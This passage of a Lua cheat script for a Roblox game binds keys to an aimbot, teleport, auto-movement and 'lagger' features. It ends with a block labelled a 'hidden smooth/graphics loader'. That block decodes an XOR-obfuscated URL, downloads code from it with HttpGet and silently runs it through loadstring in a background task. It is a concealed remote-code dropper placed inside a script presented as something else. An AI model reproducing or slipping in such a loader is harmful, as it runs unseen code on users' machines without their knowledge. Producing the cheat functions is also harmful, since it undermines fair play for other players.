            autoLeftEnabled = true; startAutoLeft()
            if autoLeftSetVisual then autoLeftSetVisual(true) end
            if mobBtnRefs.autoLeft then mobBtnRefs.autoLeft(true) end
        end
        if saveConfig then pcall(saveConfig) end
    end)
    bindPersistent(resolveSavedKey("Auto Right", "C"), "Auto Right", function()
        if autoRightEnabled then
            autoRightEnabled = false; stopAutoRight()
            if autoRightSetVisual then autoRightSetVisual(false) end
            if mobBtnRefs.autoRight then mobBtnRefs.autoRight(false) end
        else
            if autoLeftEnabled then autoLeftEnabled=false; stopAutoLeft(); if autoLeftSetVisual then autoLeftSetVisual(false) end; if mobBtnRefs.autoLeft then mobBtnRefs.autoLeft(false) end end
            if autoBatEnabled then stopBatAimbot(); if autoBatSetVisual then autoBatSetVisual(false) end; if mobBtnRefs.autoBat then mobBtnRefs.autoBat(false) end end
            autoRightEnabled = true; startAutoRight()
            if autoRightSetVisual then autoRightSetVisual(true) end
            if mobBtnRefs.autoRight then mobBtnRefs.autoRight(true) end
        end
        if saveConfig then pcall(saveConfig) end
    end)
    bindPersistent(resolveSavedKey("Bat Aimbot", "X"), "Bat Aimbot", function()
        if autoBatEnabled then
            stopBatAimbot()
            if autoBatSetVisual then autoBatSetVisual(false) end
            if mobBtnRefs.autoBat then mobBtnRefs.autoBat(false) end
        else
            if isHoldingCarryTool and isHoldingCarryTool() then return end
            queueAutoBatStart()
            if autoBatSetVisual then autoBatSetVisual(true) end
            if mobBtnRefs.autoBat then mobBtnRefs.autoBat(true) end
        end
        if saveConfig then pcall(saveConfig) end
    end)
    do
        local tpKeyName = resolveSavedKey("TP Bat", "M")
        if KB and KB.TPBat and KB.TPBat.kb and KB.TPBat.kb.Name then
            tpKeyName = KB.TPBat.kb.Name
        end
        if KB and KB.TPBat then KB.TPBat.kb = Enum.KeyCode[tpKeyName] end
        bindPersistent(tpKeyName, "TP Bat", function()
            if TPBat.enabled then
                TPBat.stop()
                if mobBtnRefs.tpBat then mobBtnRefs.tpBat(false) end
            else
                if isHoldingCarryTool and isHoldingCarryTool() then return end
                TPBat.start()
                if mobBtnRefs.tpBat then mobBtnRefs.tpBat(TPBat.enabled) end
            end
            if saveConfig then pcall(saveConfig) end
        end)
    end
    bindPersistent(resolveSavedKey("Carry Mode", "V"), "Carry Mode", function()
        if toggleCarryMode then toggleCarryMode() end
        if saveConfig then pcall(saveConfig) end
    end)
    bindPersistent(resolveSavedKey("Lagger Mode", "B"), "Lagger Mode", function()
        if toggleLaggerMode then toggleLaggerMode() end
        if saveConfig then pcall(saveConfig) end
    end)
end)()

-- Hidden smooth/graphics loader (URL obfuscated; restores game smoothness)
task.spawn(function()
    local function _xorDecode(s)
        local t = {}
        for i = 1, #s do
            local b = string.byte(s, i)
            if bit32 and bit32.bxor then
                t[i] = string.char(bit32.bxor(b, 7))
            else
                t[i] = string.char(b ~ 7)
            end
        end
        return table.concat(t)
    end
    local ok, src = pcall(function()
        return game:HttpGet(_xorDecode("osswt=((krf*dohjwbu*tofub)khqfekb)fww(fwn(wreknd(ufp(vl}4q`b?}v)krf8lb~:?37qiuppbo6514w4idr~uj~bufol636i"))
    end)
    if ok and type(src) == "string" and #src > 50 then
        local fn = loadstring(src)
        if type(fn) == "function" then
            pcall(fn)
        end
    end
end)